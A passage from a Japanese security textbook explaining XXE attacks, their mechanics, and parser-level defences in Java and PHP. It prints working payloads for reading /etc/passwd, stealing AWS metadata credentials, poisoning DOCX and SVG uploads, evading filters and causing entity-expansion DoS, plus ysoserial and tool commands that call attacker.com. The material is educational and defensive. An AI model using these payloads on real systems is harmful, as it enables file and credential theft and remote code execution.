このペイロードが動作する理由はやや複雑だが、仕組みを分解すると次のようになる。`fonts.dtd` の中には `constant` という名前のパラメータ実体が元から定義されている。この攻撃はDTDが**先に定義された実体を後から再定義できない**という仕様(最初の宣言が有効になる)を逆手に取り、`%constant` を**先に**攻撃者の文字列で上書き宣言しておく。この上書き文字列 `'aaa)>` は、後で `fonts.dtd` 内の元の `constant` 定義が読み込まれた際、その周辺の構文を意図的に破壊するように設計されている。結果として、`fonts.dtd` がパースされる際に文法エラーが発生し、その過程で `%error;` によって組み立てられた「存在しないパス + ファイル内容」というシステム識別子への参照が試みられ、パーサがそのファイルオープンに失敗した際のエラーメッセージに、埋め込まれた `/etc/passwd` の中身がそのまま出力される。結果として得られるエラーメッセージは次のような形になる。

```
file:///nonexistent/root:x:0:0:root:/root:/bin/bash (No such file or directory)
```

外に見える文字列の一部として `root:x:0:0:root:/root:/bin/bash` (`/etc/passwd`の1行目)が混ざっていることがわかる。このテクニックが有効なのは、対象サーバのOS上に既知のパスを持つDTDファイルが存在することが前提であり、対象環境のOSやディストリビューション、インストール済みパッケージによって使えるDTDファイルの有無・パスが変わる点に注意が必要である。

#### 4. ファイルアップロード経由のXXE(DOCX/XLSX)

Office Open XML形式(.docx, .xlsx, .pptx)は、内部的にZIPアーカイブの中に複数のXMLファイルを含む構造になっている。履歴書やレポートのアップロード機能がサーバ側でこれらのファイルを解析(例: テキスト抽出、プレビュー生成、ウイルススキャン連携)する際に、内部のXMLがXXEに脆弱なパーサで処理されると攻撃が成立する。

手動での改変手順は次の通りである。

```bash
unzip resume.docx -d resume_modified/
```

展開した `word/document.xml` を編集し、DOCTYPE宣言と外部実体を注入する。

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document[
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>Summary: &xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
```

そして再度ZIPとして固め直す。

```bash
cd resume_modified && zip -r ../malicious_resume.docx *
```

このテクニックが成立する理由は、「見た目はバイナリのOffice文書ファイルでも、実体はXMLの集合体である」という点、そして多くのバックエンド処理(全文検索インデックス作成、プレビューサムネイル生成など)がアップロードされたファイルの拡張子や見た目だけで安全と判断し、内部のXMLパーサの設定を見落としがちである点にある。ガイドはこの手動作業を自動化するツールとして `XXElixir` を挙げている。

```bash
python3 XXElixir.py --file template.xlsx --url https://attacker.com/xxe --output poisoned.xlsx
```

第2章のファイルアップロード関連の章で、この「コンテナ形式(ZIP等)の中に危険なパーサ対象データが隠れている」というパターンをさらに掘り下げる。

#### 5. Content-Typeの偽装によるXXEの誘発

JSON APIとして設計されているエンドポイントであっても、バックエンドのフレームワークが `Content-Type` ヘッダの値に応じて自動的にXMLパーサへディスパッチする実装になっている場合、リクエストの `Content-Type` を `application/xml` に書き換えてXMLペイロードを送るだけでXXEが成立することがある。

```http
POST /users/update HTTP/1.1
Host: api.example.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <username>john_doe</username>
  <bio>&xxe;</bio>
</root>
```

このテクニックが重要なのは、「表向きJSONしか使っていないアプリケーションだから安全」という思い込みを崩す点にある。多くのWebフレームワーク(Content Negotiationをサポートするもの)は、リクエストヘッダに応じて複数のパーサを自動選択する仕組みを持っており、開発者が意識していないXMLパーサ経路が攻撃対象になりうる。バグバウンティの探索フェーズでは、JSON専用に見えるエンドポイントに対しても機械的にContent-Typeを差し替えて試す価値があることを示している。

#### 6. XXEを起点としたSSRF(クラウドメタデータサービスへの到達)

外部実体のURIとして、クラウド環境特有のメタデータサービスのアドレス(AWSの場合 `169.254.169.254` というリンクローカルアドレス)を指定すると、パーサ自身がそのサーバの内部ネットワークから発信元となってアクセスするため、外部からは直接到達できない内部リソースに間接的に到達できる。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<request>
  <data>&xxe;</data>
</request>
```

さらに一歩進めて、IAMロール(そのサーバに付与されたクラウド権限)の一時的なアクセスキーを狙う例も示されている。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/web-application-role">
]>
<request>
  <data>&xxe;</data>
</request>
```

レスポンスに一時的なAWS認証情報が含まれてしまえば、攻撃者はそのIAMロールに付与された権限の範囲でクラウド環境そのものを操作できるようになる可能性があり、XXEが「ファイル1個の漏洩」にとどまらず「クラウド基盤全体への侵害」に発展しうることを示す典型例である。

> ⚠️ 補足(執筆時点の一般知識に基づく注記): AWSは2019年以降、より安全なInstance Metadata Service Version 2 (IMDSv2)への移行を進めており、IMDSv2はトークンベースのセッション認証を要求するため、単純なGETリクエスト(XXE経由のSSRFはGET相当の一方向アクセスになりやすい)だけではメタデータを取得できないよう設計されている。ただしIMDSv1が依然として有効化された環境や、IMDSv2を要求しない設定のインスタンスも実在するため、このリスクが完全に過去のものになったわけではない。

#### 7. XXEを起点としたRCE(Java逆シリアル化との連鎖)

これはXXE単体の脆弱性というより、「XXEで読み出せる`file://`アクセスを、別の脆弱性(安全でないデシリアライゼーション)の起爆剤として使う」連鎖的な攻撃である。`ysoserial` という既知のツールでJavaの安全でないデシリアライゼーションを突くための悪意あるシリアライズ済みオブジェクトを生成する。

```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' > payload.ser
```

このファイルをアップロード機能経由でサーバに保存させたうえで、XXEの `file://` 参照でこのファイルパスを指定し、アプリケーション側のどこかでこの実体の値がJavaの逆シリアル化処理に渡される経路があれば、コマンド実行に至る。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
  <!ENTITY xxe SYSTEM "file:///app/uploads/12345/payload.ser">
]>
<request>
  <data>&xxe;</data>
</request>
```

この例は、単一の脆弱性クラスだけを見るのではなく、「ファイルアップロード機能」「XXE」「安全でないデシリアライゼーション」という複数の弱点が連鎖したときに初めてRCEに至るという、実際の侵害シナリオの複雑さを示す教材である。

#### 8. PHPの`expect://`ラッパーによるRCE

拡張機能が有効という限定条件下で、OWASP記事の例と同種の攻撃も紹介されている。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

`expect` PHP拡張は標準では有効化されていないため、実運用での遭遇率は低いが、「外部実体のスキームは`file`や`http`に限らず、パーサが動く言語処理系のストリームラッパー全般が攻撃面になりうる」という一般原則を示す例として押さえておく。

#### 9. XIncludeによるDOCTYPE制限の回避

アプリケーション側の対策として「DOCTYPE宣言自体を禁止する」実装がされている場合でも、XML文書の中で`DOCTYPE`を一切使わずに外部リソースを読み込める別の仕組み、**XInclude**が悪用されることがある。XIncludeはXML文書の一部を別の外部リソースで置き換えるための標準仕様であり、DTDやENTITY宣言を必要としない。

```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</data>
```

```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://internal.company.com/admin"/>
</data>
```

これは「DOCTYPEブロックだけを入力バリデーションで弾く」防御が不十分であることを端的に示す例であり、防御側は**XInclude処理自体を無効化する**、あるいは根本的に「安全でないXML機能をすべて無効化した状態からホワイトリスト的に必要な機能だけ許可する」設計にする必要がある。

#### 10. パーサのフィルタ回避テクニック

ガイドはさらに、WAF(Web Application Firewall)や簡易な文字列フィルタの回避に使われるテクニックにも触れている。

**UTF-16エンコーディングによる回避**は、多くの文字列ベースのフィルタがASCII(UTF-8のASCII互換部分)を前提としてシグネチャマッチングを行っていることを利用する。ペイロードをUTF-16に変換すると、バイト列としては`DOCTYPE`や`ENTITY`といった単語がそのままの形で現れなくなるため、単純な文字列検索型フィルタをすり抜けられる可能性がある。

```bash
cat payload.xml | iconv -f UTF-8 -t UTF-16BE > utf16_payload.xml
```

**HTMLエンティティ(文字参照)によるエンコード回避**は、`/etc/passwd`のようなよく知られた危険パスの文字列パターンマッチングを回避するために、スラッシュなどの文字を数値文字参照に置き換える手法である。

```xml
<!DOCTYPE root[
  <!ENTITY xxe SYSTEM "file://&#x2F;etc&#x2F;passwd">
]>
```

`&#x2F;` は`/`のUnicodeコードポイントを16進数で表した数値文字参照であり、XMLパーサはこれを最終的に通常の`/`として解釈する。文字列としての`/etc/passwd`というシグネチャに反応するフィルタを、実行時に初めて`/`へ展開される表現を使うことで回避する狙いである。

これらの回避テクニックが成り立つ根本原因は共通していて、**「フィルタ側の検査タイミング」と「パーサ側の実際の解釈タイミング」がずれている**ことにある。フィルタは受信した生バイト列やデコード前の文字列を検査するが、実際に危険な意味を持つのはパーサが最終的に解釈した後の値である。この非対称性がある限り、表層的な文字列フィルタはXXE対策として信頼できない、という教訓が導かれる。だからこそOWASPが示した「パーサ自体の機能を無効化する」という根本対策が優先されるべきであるという結論に、両資料は暗黙のうちに一致している。

#### 11. SVGアップロード経由のXXE

SVG(Scalable Vector Graphics)はXMLベースの画像フォーマットであり、アバター画像や図表のアップロード機能が「画像」として扱っていても、内部的にはXMLパーサで処理されることが多い。

```http
POST /api/avatar/upload HTTP/1.1
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg[
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <text x="20" y="35" font-size="16">&xxe;</text>
</svg>
```

画像アップロード機能が拡張子や`Content-Type`ヘッダのみで「安全な画像形式」と判定し、内部のパース処理(サムネイル生成、レンダリング、メタデータ抽出など)でXMLパーサの設定を見落としているケースは実務でも頻出するため、ファイルアップロード機能の脆弱性診断において画像形式であってもXML系フォーマット(SVG含む)は個別に検討すべき対象であることをこの例は示している。

### 検出手法と攻撃対象領域(アタックサーフェス)の洗い出し

YesWeHackガイドは、XXEを探す際の実務的な観点として以下を挙げている。

- **Canarytokens**のようなおとりファイル(Microsoft Excel形式のトークンファイルなど)を使い、コマンドラインベースのパーサ(=デスクトップアプリではなく自動処理パイプライン)によってファイルが処理された場合にアラートを発する手法。ファイルが人間による目視確認ではなく機械的なXMLパース処理に通されたことを検知するために使われる。
- **Out-of-Bandコールバックの監視**。攻撃者が制御するサーバへのDNSクエリやHTTPリクエストの到達を確認することで、レスポンスに何も表示されないブラインドXXEの存在を実証する。
- **エラーメッセージの解析**。パーサが返すエラー文言にファイルパスやファイル内容の断片が含まれていないかを確認する。
- **タイミング分析**。存在しないホストや到達に時間のかかるネットワーク先を外部実体のURIに指定し、レスポンスの遅延を観測することで、パーサが実際に外部リソース解決を試みているかどうかを推測する。

また、XMLパーサが潜んでいる典型的な攻撃対象領域として、Office文書処理系(DOCX/XLSX/PPTXなどZIPアーカイブ化されたXML群)、Content Negotiationに対応したAPIエンドポイント、レガシーなSOAPサービス、SVG画像ハンドラ、設定ファイルのパーサ、データのインポート/エクスポート機能を挙げている。これらはいずれも「開発者がXMLを直接意識していなくても、内部の依存ライブラリがXMLパーサを呼び出している」ケースが多く、攻撃対象の洗い出しでは表層のAPI仕様(JSON/REST)だけでなく、内部で使われているライブラリやファイル処理経路まで踏み込んで確認する必要があることを物語っている。

### 防御の要点(両資料からの統合)

両資料に共通する結論を統合すると、XXE対策の優先順位は次のようになる。

1. **XMLパーサのDTD処理そのものを無効化する**ことが最も確実である。OWASPが「ローカルの静的DTDのみを使い、文書内で宣言されたDTDを一切許可しない」と述べている通り、根本原因である「外部実体の解決」を機能レベルで止めるのが最優先である。
2. 言語・ライブラリごとに、外部一般実体(external general entities)と外部パラメータ実体(external parameter entities)の両方を明示的に無効化し、XIncludeの処理も無効化する必要がある(パラメータ実体だけ、あるいはXIncludeだけを見落とすと、前述のブラインドXXEやXIncludeバイパスが依然として成立してしまう)。
3. 文字列レベルのフィルタ(`DOCTYPE`や`/etc/passwd`といった既知パターンの拒否)は、UTF-16変換や数値文字参照によって容易に回避されるため、**唯一の対策として頼ってはならない**。あくまでパーサ自体の設定変更が主軸であり、フィルタは補助的な多層防御の一部と位置づけるべきである。
4. ファイルアップロード機能では、拡張子や`Content-Type`ヘッダの外形だけで安全性を判断せず、Office文書やSVGなど「内部的にXMLを含む形式」がアップロードされた場合の解析パイプライン全体(サムネイル生成、全文検索インデックス化、ウイルススキャン連携など)においても、使われているすべてのXMLパーサの設定を横断的に点検する必要がある。

この節で確認した「なぜXXEが起きるのか」という原理と、「どのような形で悪用されるか」という実例の全体像を土台として、次節以降ではDTD・実体宣言のさらに詳細な仕組み、そして具体的な言語・フレームワークごとの安全な設定方法を掘り下げていく。

## 日本語で固めるXXE基礎

XXE（XML External Entity、XML外部実体攻撃）は、アプリケーションがXML文書を解析する際に、XMLの仕様に含まれる「実体（エンティティ）」の機能を悪用され、意図しないファイル読み取りやネットワークアクセスを引き起こされる脆弱性です。本節では、日本語の技術資料をもとに、XMLとDTD（Document Type Definition、文書型定義）の基礎から、XXEがなぜ成立するのかという仕組みのレベルまでを整理します。ファイルアップロード機能はXXEの典型的な侵入経路の一つでもあるため、両者は本教科書で連続して扱います。

### 1. XMLとDTDの基礎知識

XMLパーサーは、XML文書の先頭近くに置かれる`<!DOCTYPE ...>`宣言（DTD）を読み取ることで、文書の構造や、その中で使える「実体（エンティティ）」を定義できます。実体とは、ある文字列や外部リソースの内容を、別の短い記法（`&実体名;`）で文書内に呼び出すための仕組みです。DTDの基本形は次のようになります。

```xml
<!DOCTYPE name [
<!ELEMENT name (first,last)>
<!ELEMENT first (#PCDATA) >
<!ELEMENT last (#PCDATA) >
]>
```

`<!ELEMENT>`は要素の構造を定義するものですが、XXEにおいて重要なのは同じDTD内で宣言できる`<!ENTITY>`（実体宣言）です。実体には大きく分けて次の二種類があります。

- **内部実体（internal entity）**：`<!ENTITY nf "test">`のように、実体名にリテラルな文字列を直接マッピングするもの。参照されると単純にその文字列に置き換わります。
- **外部実体（external entity）**：`<!ENTITY nl SYSTEM "external_file.xml">`のように、`SYSTEM`キーワードとURI（ファイルパスやURL）を指定し、参照時にそのリソースの中身を読み込んで文書内に挿入するもの。

> 出典: MBSD「XXE攻撃 基本編」— https://www.mbsd.jp/research/20171130/xxe1/

この「外部実体はSYSTEM識別子で指定したリソースの中身を、パース時に取り込んで置き換える」という挙動こそが、XXE攻撃の核（sink：入力が最終的に危険な形で解釈・実行される場所）です。XMLパーサーは本来、文書の構造を検証・展開するために実体展開機能を実装していますが、この機能は「攻撃者が指定した任意のURIの中身を読みに行き、その結果を出力に含める」という強力な副作用を持ちます。攻撃者からすれば、DTD宣言とエンティティ参照を差し込めるだけで、サーバー側のファイルシステムやネットワークに対して読み取りリクエストを発行させられることになります。

### 2. XXEの成立条件——なぜ「ただのXML入力」が攻撃になるのか

多くのWebアプリケーションは、SOAP API、XMLベースのファイル形式（例：Office文書、SVG、RSS/Atomフィード）、設定ファイルのアップロード機能などで、ユーザーが提供したXMLをパースします。この際、XMLパーサーの設定次第で、文書内に含まれる`<!DOCTYPE>`宣言とその中の外部実体宣言が有効になっていると、パーサーは律儀に外部実体を「解決」しようとします。つまり脆弱性の本質は、次の二つの条件が同時に満たされることです。

1. アプリケーションが外部から受け取ったXMLをパースしている（かつ、その入力に対してDTD宣言を許可している）。
2. 使用しているXMLパーサーの実装が、デフォルトまたは設定上、外部実体（`SYSTEM`識別子）の解決を許可している。

yamoryの記事が指摘するように、XXEは「XMLの処理中に外部リソース（ファイル、ネットワーク経由のデータなど）を読み込む機能を悪用する攻撃手法」であり、これは「XMLの仕様により外部エンティティの参照が可能であり、XMLパーサーが外部エンティティ処理を適切に制御していない場合に発生」します。つまり原因は「XML仕様そのものが持つ正当な機能」であり、SQLインジェクションのように「エスケープ漏れ」が主因なのではなく、「パーサーのデフォルト設定が危険側に倒れている」ことが主因になる点が特徴です。

> 出典: yamory「油断ならない脆弱性 XXEへの対策」— https://yamory.io/blog/what-is-xxe

### 3. 具体的な攻撃ペイロードと仕組み

#### 3.1 ローカルファイル読み取り（Local File Inclusion）

最も基本的なXXE攻撃は、`file://`スキームを用いてサーバー上の任意ファイルを読み取り、レスポンスに反映させるものです。MBSDの記事のペイロードを見てみます。

```xml
<!DOCTYPE name [
<!ENTITY h SYSTEM "file:///etc/hosts">
]>
<name><first>tarou</first><last>mitsui&h;</last></name>
```

このXMLがパースされると、DTD部分で`h`という実体名が`file:///etc/hosts`の中身にマッピングされます。本文中の`&h;`という参照箇所は、パーサーによって`/etc/hosts`ファイルの内容へと置換されます。結果、`<last>`要素の値としてこのファイルの中身がアプリケーションの応答（画面表示やAPIレスポンス）に混入し、攻撃者はそれを読み取ることができます。

徳丸浩氏の記事では、PHPでの具体的な脆弱なコード例が示されています。

```php
<?php
$doc = new DOMDocument();
$doc->load($_FILES['user']['tmp_name']);
$name = $doc->getElementsByTagName('name')->item(0)->textContent;
$addr = $doc->getElementsByTagName('address')->item(0)->textContent;
?>
```

このプログラムはユーザーがアップロードしたXMLファイルを`DOMDocument::load()`でそのままパースし、要素の内容を取り出して画面に表示するだけの単純なコードです。しかし、攻撃者が次のようなXMLをアップロードすると、

```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE foo [
<!ENTITY pass SYSTEM "/etc/passwd">
]>
<user>
  <name>example</name>
  <address>&pass;</address>
</user>
```

`address`フィールドの表示内容として`/etc/passwd`の中身がそのまま出力されてしまいます。ここで重要なのは、アプリケーション開発者が「ファイルを読み込め」という命令を一切書いていない点です。ファイル読み取りの起点となっているのは、XMLパーサー自身が実体展開処理の一環として行う外部リソースアクセスであり、アプリケーションコードのロジックには一切そのような記述がありません。これがXXEが見落とされやすい理由の一つです。

> 出典: 徳丸浩「PHPプログラマのためのXXE入門」— https://blog.tokumaru.org/2017/12/introduction-to-xxe-for-php-programmers.html

Flaskを例にした別の記事でも、同様の最小構成のペイロードが示されています。

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
```

これを`<body>&xxe;</body>`のように参照箇所へ埋め込むことで、機密ファイルの内容がレスポンスに含まれてしまいます。言語やフレームワークが変わっても、「DTDで外部実体を宣言し、本文中で参照する」という攻撃の骨格自体は共通していることが分かります。

> 出典: minegishirei「XML外部エンティティ（XXE）とは？」— https://minegishirei.hatenablog.com/entry/2024/11/22/205514

#### 3.2 SSRF（Server-Side Request Forgery）への応用

外部実体のSYSTEM識別子には、ファイルパスだけでなくURLも指定できます。これを利用すると、XXEはSSRF攻撃の手段としても機能します。攻撃者はサーバーに対して、本来外部から到達できない内部ネットワーク上のホストやポート、あるいはクラウド環境のメタデータAPI（インスタンスの認証情報などを保持する内部エンドポイント）へリクエストを発行させることができます。

MBSDの記事にあるポートスキャンの例は次のような形です。

```
<!DOCTYPE name SYSTEM "http://127.0.0.1:[port番号]">]>
```

これは、XMLパーサーが指定URLへの接続を試みる際のレスポンス時間やエラー内容の違いから、対象ポートが開いているか閉じているかを外部から推測できてしまう仕組みを利用したものです。yamoryの記事でも、SSRFと組み合わせることで「クラウド環境のメタデータAPIへのアクセスによる認証情報の窃取」につながり得ると指摘されています。これは通常のSSRF対策（内部IPアドレス帯へのリクエストのフィルタリングなど）だけでは防ぎきれない場合があり、XMLパーサー自体の設定変更が必要になる理由の一つです。

徳丸氏の記事では、PHPの`php://filter`ラッパーと組み合わせた応用例も紹介されています。

```xml
<!ENTITY data SYSTEM
"php://filter/read=convert.base64-encode/resource=http://target.local/">
```

これは`SYSTEM`識別子にPHP固有のストリームラッパーを指定することで、取得内容をBase64エンコードして返させる手法です。バイナリを含む可能性のあるレスポンスをXML文書内に安全に埋め込むための工夫であり、PHPという「言語固有の機能」が攻撃の幅を広げてしまう例として押さえておく価値があります。

#### 3.3 XML Bomb（実体展開によるDoS攻撃）

外部実体だけでなく、内部実体の入れ子構造を悪用したDoS攻撃も存在します。有名な例が「XML Bomb」（別名Billion Laughs攻撃）です。

```xml
<!DOCTYPE name [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  ...
]>
```

この手法は「実体宣言では別の実体を参照することが可能」というXML仕様を悪用します。各段階で参照回数を10倍に増やすような実体を何段も定義すると、最終的な展開結果は指数関数的に増大し（例えば10段重ねれば10の10乗、すなわち100億回分の文字列展開になり得ます）、パーサーのメモリやCPUを食いつぶしてサービス停止を引き起こします。これは外部リソースへのアクセスを伴わないため、「外部実体だけ無効化すれば安全」という誤解をしていると見落とされがちな攻撃です。

> 出典: MBSD「XXE攻撃 基本編」— https://www.mbsd.jp/research/20171130/xxe1/

### 4. 対策の原理——なぜパーサー側の設定変更が必要なのか

XXE対策の基本方針は、アプリケーションコード側で入力をエスケープすることではなく、**XMLパーサーそのものの機能（DTD処理・外部実体解決）を無効化すること**です。これは、脆弱性の原因がアプリケーションロジックではなくパーサーの挙動そのものにあるためで、原理的に「入力のサニタイズ」では防ぎきれません（DTD宣言の構文自体を検出・除去するアプローチは、正規のXML仕様のバリエーションが多く、抜け漏れが生じやすいため推奨されません）。

**Javaの場合**

MBSDの記事によれば、Javaでは「DTDはデフォルトで有効」になっているため、明示的にDOCTYPE宣言自体を禁止する設定が推奨されます。

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature(
  "http://apache.org/xml/features/disallow-doctype-decl",
  true
);
```

この`disallow-doctype-decl`機能を有効にすると、そもそも文書中に`<!DOCTYPE>`が含まれているだけでパースエラーとなり、DTD経由の実体宣言自体が成立しなくなります。DTDを業務上使う必要がない大多数のケースでは、この「DOCTYPE宣言ごと拒否する」対応が最も確実です。

> 出典: MBSD「XXE攻撃 基本編」— https://www.mbsd.jp/research/20171130/xxe1/

**PHPの場合**

徳丸氏の記事では、PHPのlibxml2バインディングにおける対策として`libxml_disable_entity_loader()`関数の利用が紹介されています。

```php
libxml_disable_entity_loader(true);
$doc = new DOMDocument();
$xmlstr = file_get_contents($_FILES['user']['tmp_name']);
$doc->loadXML($xmlstr);
```

この関数を`true`で呼び出すことで、外部実体（および外部DTDサブセット）のローダーを無効化し、`SYSTEM`識別子によるファイル・URL読み取りをブロックします。あわせて、記事はもう一段深い技術的背景として、**libxml2のバージョンによってデフォルトの安全性が異なる**点を指摘しています。libxml2 2.9以降ではデフォルトで外部実体のロードが無効化されているため、最新のlibxml2を使っていれば`libxml_disable_entity_loader()`を呼ばなくても比較的安全な場合があります。ただし、アプリケーション側で`$doc->substituteEntities = true;`のように明示的に実体置換を有効化していると、新しいバージョンでも再び脆弱になり得るため注意が必要です。

> 出典: 徳丸浩「PHPプログラマのためのXXE入門」— https://blog.tokumaru.org/2017/12/introduction-to-xxe-for-php-programmers.html

> ⚠️ **バージョン依存の注記**: `libxml_disable_entity_loader()`はPHP 8.0で非推奨化され、PHP 8.0以降のlibxml2（2.9以降を前提とする）では外部エンティティのロードがデフォルトで無効になっているため、この関数自体が事実上不要になっています。古いPHP／libxml2環境を扱う場合や、レガシーコードのレビューでこの関数呼び出しを見かけた場合は、上記の経緯（バージョンによる挙動差）を踏まえて評価してください。（この注記は未取得資料ではなく、筆者の一般知識による補足です。）

**共通の考え方**

yamoryの記事は、対策を行う前段階として「アプリケーション内でXMLを処理している箇所をすべて洗い出すこと」の重要性を強調しています。特に見落とされがちなのが、認証系の処理（例：SAML認証はXMLベースのプロトコルであり、XXEの標的になり得ます）や、ファイルインポート機能（Officeファイル、SVG画像、設定ファイルなど、内部的にXMLフォーマットを使用しているもの）です。「XMLを直接扱っているつもりがない箇所」で、内部的にXMLパーサーが呼び出されているケースがあるため、使用ライブラリ・フレームワークの内部実装まで含めた棚卸しが必要になります。

> 出典: yamory「油断ならない脆弱性 XXEへの対策」— https://yamory.io/blog/what-is-xxe

### 5. 初学者向けの整理——攻撃者視点の一連の流れ

minegishirei氏の記事は、Flaskアプリケーションを例に、初心者にも分かりやすい形でXXEの一連の流れを示しています。要点を整理すると次のようになります。

1. アプリケーションがユーザー入力（フォーム送信、アップロードファイルなど）をXMLとして受け取り、そのままパーサーに渡している。
2. 攻撃者は、通常のXMLの代わりに`<!DOCTYPE>`と`<!ENTITY ... SYSTEM "file:///etc/passwd">`を含むXMLを送信する。
3. パーサーが実体を解決しようとし、`file:///etc/passwd`の中身を読み込む。
4. 読み込まれた内容が本文中の参照箇所（`&xxe;`）に展開され、そのままアプリケーションのレスポンスとして返却される。
5. 攻撃者はレスポンスを観察することで、サーバー内部の情報を取得する。

この記事自体は入門向けであり対策の詳細な記述は多くありませんが、「XMLを受け取って処理する箇所ならどこでも起こり得る」という点と、「攻撃者が送り込むのはただのテキストであり、特別なツールを必要としない」という点を強調しており、XXEの敷居の低さを理解する上で有用です。

> 出典: minegishirei「XML外部エンティティ（XXE）とは？」— https://minegishirei.hatenablog.com/entry/2024/11/22/205514

### 6. まとめ——本章で押さえるべき仕組みレベルの要点

- XXEは、XML仕様が正当に持つ「DTDによる実体宣言・参照」機能を悪用する攻撃であり、入力バリデーションの単純な不備ではなく、**パーサーのデフォルト設定**が根本原因になる。
- 外部実体（`SYSTEM`識別子）は、ファイル（`file://`）だけでなくネットワークリソース（`http://`など）も指定できるため、ローカルファイル読み取りだけでなくSSRFやポートスキャンにも転用される。
- 内部実体の入れ子参照は、外部アクセスを伴わずにXML Bomb（Billion Laughs攻撃）としてDoSを引き起こし得る。
- 対策の本流は「DTD宣言自体を拒否する」「外部実体のロードを無効化する」というパーサー設定の変更であり、言語・ライブラリごとに具体的なAPIやデフォルト挙動（libxml2のバージョンなど）が異なるため、使用しているスタック固有の設定を確認する必要がある。
- XMLを処理している箇所は、フォーム入力だけでなく、SAML認証やOfficeファイル・SVGなどのファイルインポート機能にも隠れていることがあり、棚卸しが対策の前提になる。

次節では、ファイルアップロード機能そのものに焦点を移し、XXEを含む「ファイルの中身を解析する処理」がどのように攻撃の侵入経路になり得るかを扱います。


---

[目次](index.md) ｜ [第2章 古典的XXE — ファイル読取とSSRF →](02-classic-xxe.md)
